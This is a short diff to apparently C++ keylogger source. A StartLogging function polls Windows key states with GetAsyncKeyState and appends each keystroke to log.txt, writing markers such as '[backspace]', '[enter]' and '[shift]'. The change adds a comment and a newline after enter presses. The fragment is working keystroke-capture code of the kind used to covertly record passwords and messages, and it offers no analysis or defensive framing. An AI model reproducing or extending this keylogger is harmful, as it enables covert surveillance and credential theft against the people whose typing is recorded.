@@ -19,12 +19,12 @@ void StartLogging(){
             if(GetAsyncKeyState(c) &  0x1 ) {
                 ofstream log;
                 log.open("log.txt", ios::app);
-                switch (c) {
+                switch (c)/*This Switch-Case handles unreadable characters*/ {
                     case VK_BACK:
                         log << "[backspace]";
                         break;
                     case VK_RETURN:
-                        log << "[enter]";
+                        log << "[enter]\n";
                         break;
                     case VK_SHIFT:
                         log << "[shift]";
